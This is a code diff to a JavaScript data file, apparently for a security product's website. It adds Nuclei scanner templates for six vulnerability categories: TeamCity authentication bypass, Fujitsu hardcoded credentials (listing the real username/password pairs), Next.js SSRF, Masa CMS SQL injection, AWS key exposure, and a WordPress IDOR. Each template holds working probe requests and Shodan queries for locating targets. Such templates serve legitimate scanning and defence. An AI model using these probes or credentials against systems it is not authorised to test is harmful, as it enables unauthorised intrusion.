@@ -1,4 +1,4 @@
-const usersRated = 102.0;
+const usersRated = 102.1;
 
 const navLinksData = [
   {
@@ -638,31 +638,321 @@ const issueInfos = [
     id: 1,
     title: "Broken Authentication",
     count: 37,
+    code: `
+id: CVE-2024-27199
+
+info:
+  name: TeamCity < 2023.11.4 - Authentication Bypass
+  author: DhiyaneshDk
+  severity: high
+  description: |
+    In JetBrains TeamCity before 2023.11.4 path traversal allowing to perform limited admin actions was possible
+  reference:
+    - https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass/
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-27199
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
+    cvss-score: 7.3
+    cwe-id: CWE-23
+  metadata:
+    verified: true
+    max-request: 3
+    shodan-query: http.component:"TeamCity"
+  tags: cve,cve2024,teamcity,jetbrains,auth-bypass 
+  
+  http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/res/../admin/diagnostic.jsp"
+      - "{{BaseURL}}/.well-known/acme-challenge/../../admin/diagnostic.jsp"
+      - "{{BaseURL}}/update/../admin/diagnostic.jsp"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(header, "text/html")'
+          - 'contains_all(body, "Debug Logging", "CPU & Memory Usage")'
+        condition: and
+# digest: 490a0046304402207d46ec6991f8498ff8c74ec6ebfe0f59f19210620cab88c23c7761c7701b640102201246e4baea4f5b436b45be21c4f66bbe35e8a5f3769b78de38ee94253f331fa7:922c64590222798bb761d5b6d8e72950
+  `,
   },
   {
     id: 2,
     title: "Weak password",
     count: 62,
+    code: `
+id: CVE-2023-38433
+
+info:
+  name: Fujitsu IP Series - Hardcoded Credentials
+  author: AdnaneKhan
+  severity: high
+  description: |
+    Fujitsu Real-time Video Transmission Gear “IP series” use hard-coded credentials, which may allow a remote unauthenticated attacker to initialize or reboot the products, and as a result, terminate the video transmission. The credentials cannot be changed by the end-user and provide administrative access to the devices.
+  impact: |
+    Successful exploitation of this vulnerability could lead to unauthorized access to the device, potentially resulting in further compromise of the network.
+  reference:
+    - https://www.praetorian.com/blog/fujitsu-ip-series-hard-coded-credentials
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-38433
+    - https://www.cisa.gov/news-events/ics-advisories/icsa-23-248-01
+    - https://www.fujitsu.com/global/products/computing/peripheral/video/download
+    - https://jvn.jp/en/jp/JVN95727578
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    cvss-score: 7.5
+    cve-id: CVE-2023-38433
+    cwe-id: CWE-798
+    epss-score: 0.0031
+    epss-percentile: 0.69984
+    cpe: cpe:2.3:o:fujitsu:ip-he950e_firmware:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: fujitsu
+    product: ip-he950e_firmware
+    shodan-query:
+      - '"Server: thttpd/2.25b 29dec2003" content-length:1133'
+      - '"server: thttpd/2.25b 29dec2003" content-length:1133'
+    max-req: 1
+  tags: cve2023,cve,fujitsu,ip-series
+
+http:
+  - raw:
+      - |
+        GET /b_download/index.html HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64(username + ':' + password)}}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - fedish264pro
+        - fedish265pro
+      password:
+        - h264pro@broadsight
+        - h265pro@broadsight
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Field Support'
+
+      - type: status
+        status:
+          - 200
+# digest: 490a004630440220339e122342e81795d73baca010a14f5f18ebda3889eb36b5df9ad2052cc451f90220310bcf82220b0bcebf3650c9eed525433112c6c74a38dfdced33aecf17eb6784:922c64590222798bb761d5b6d8e72950
+    `,
   },
   {
     id: 3,
     title: "Out of band",
     count: 50,
+    code: `
+id: CVE-2024-34351
+
+info:
+  name: Next.js - Server Side Request Forgery (SSRF)
+  author: righettod
+  severity: high
+  description: |
+    Next.Js, inferior to version 14.1.1, have its image optimization built-in component prone to SSRF.
+  remediation: Upgrade to Next.js version 14.1.1 or higher.
+  reference:
+    - https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-34351
+    - https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g
+    - https://github.com/vercel/next.js/commit/8f7a6ca7d21a97bc9f7a1bbe10427b5ad74b9085
+    - https://github.com/vercel/next.js/pull/62561
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cve-id: CVE-2024-34351
+    cwe-id: CWE-918
+    epss-score: 0.00062
+    epss-percentile: 0.26843
+  metadata:
+    max-request: 2
+    product: next.js
+    shodan-query:
+      - http.html:"/_next/static"
+      - cpe:"cpe:2.3:a:zeit:next.js"
+    fofa-query: body="/_next/static"
+  tags: cve,cve2024,vercel,nextjs,ssrf
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/_next/image?w=16&q=10&url=http://{{interactsh-url}}'
+      - '{{BaseURL}}/_next/image?w=16&q=10&url=https://{{interactsh-url}}'
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - 'http'
+
+      - type: word
+        part: body
+        words:
+          - "The requested resource isn't a valid image"
+# digest: 4a0a0047304502201cb22b31416f184c4beeafb402db2f170f661e1cb990d6fd5ab034d847bfa51c022100fdeb601572c1a7b843247ef5294a0243a39df1a90310dcb0fc97a3edd48bde6f:922c64590222798bb761d5b6d8e72950
+    `,
   },
   {
     id: 4,
     title: "SQL Injection",
     count: 43,
+    code: `
+id: CVE-2024-32640
+
+info:
+  name: Mura/Masa CMS - SQL Injection
+  author: iamnoooob,rootxharsh,pdresearch
+  severity: critical
+  description: |
+    The Mura/Masa CMS is vulnerable to SQL Injection.
+  impact: |
+    Successful exploitation could lead to unauthorized access to sensitive data.
+  remediation: |
+    Apply the vendor-supplied patch or update to a secure version.
+  reference:
+    - https://blog.projectdiscovery.io/hacking-apple-with-sql-injection/
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32640
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: masacms
+    product: masacms
+    shodan-query:
+      - 'Generator: Masa CMS'
+      - "generator: masa cms"
+  tags: cve,cve2024,sqli,cms,masa,masacms
+
+http:
+  - raw:
+      - |
+        POST /index.cfm/_api/json/v1/default/?method=processAsyncObject HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        object=displayregion&contenthistid=x'&previewid=1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 500'
+          - 'contains(header, "application/json")'
+          - 'contains_all(body, "Unhandled Exception")'
+          - 'contains_all(header,"cfid","cftoken")'
+        condition: and
+# digest: 490a0046304402206eccd0783b81a569061e6e996a33b917a1eca34bb2e26b04e47993cf4137690f02203413cd6642c7e01f2dbd3b6bf10fba063c483073a1da5349b56a666d945f008e:922c64590222798bb761d5b6d8e72950
+    `,
   },
   {
     id: 5,
     title: "Secrets",
     count: 31,
+    code: `
+id: aws-access-secret-key
+
+info:
+  name: AWS Access/Secret Key Disclosure
+  author: tess
+  severity: unknown
+  metadata:
+    verified: true
+    max-request: 1
+  tags: disclosure,aws,exposure,amazon
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'accessKeyId'
+          - 'secretAccessKey'
+        condition: and
+        case-insensitive: true
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4b0a00483046022100a18f27b205b0f4d3b502a4ad5a326cc65b76afe8be03898378095eb657a54250022100a2ccd7b2cc4d37ff5a84631a0feed54b5fb00f69b5ec7da55a1957a58e73020c:922c64590222798bb761d5b6d8e72950
+    `,
   },
   {
     id: 6,
     title: "IDOR",
     count: 55,
+    code: `
+id: CVE-2020-13700
+
+info:
+  name: WordPresss acf-to-rest-api <=3.1.0 - Insecure Direct Object Reference
+  author: pikpikcu
+  severity: high
+  description: |
+    WordPresss acf-to-rest-ap through 3.1.0 allows an insecure direct object reference via permalinks manipulation, as demonstrated by a wp-json/acf/v3/options/ request that can read sensitive information in the wp_options table such as the login and pass values.
+  impact: |
+    An attacker can exploit this vulnerability to access sensitive data, such as user information or administrative credentials.
+  remediation: |
+    Update the acf-to-rest-api plugin to version >3.1.0 or apply the latest security patches.
+  reference:
+    - https://gist.github.com/mariuszpoplwski/4fbaab7f271bea99c733e3f2a4bafbb5
+    - https://wordpress.org/plugins/acf-to-rest-api/#developers
+    - https://github.com/airesvsg/acf-to-rest-api
+    - https://nvd.nist.gov/vuln/detail/CVE-2020-13700
+    - https://github.com/ARPSyndicate/cvemon
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cve-id: CVE-2020-13700
+    cwe-id: CWE-639
+    epss-score: 0.01831
+    epss-percentile: 0.88233
+    cpe: cpe:2.3:a:acf_to_rest_api_project:acf_to_rest_api:*:*:*:*:*:wordpress:*:*
+  metadata:
+    max-request: 1
+    vendor: acf_to_rest_api_project
+    product: acf_to_rest_api
+    framework: wordpress
+  tags: cve,cve2020,wordpress,plugin,acf_to_rest_api_project
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/wp-json/acf/v3/options/a?id=active&field=plugins'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 'Content-Type: application/json'
+
+      - type: word
+        part: body
+        words:
+          - 'acf-to-rest-api/class-acf-to-rest-api.php'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100aec7e7c4fcb60c57ef25e6cc1ae2372d27bb9b95b632e0fb4e3c7c0c9feb7766022015ad75e81bbe30e6cf1acedf96073238c86309f593297993c44d0d7f7b49189b:922c64590222798bb761d5b6d8e72950
+    `,
   },
 ];
 
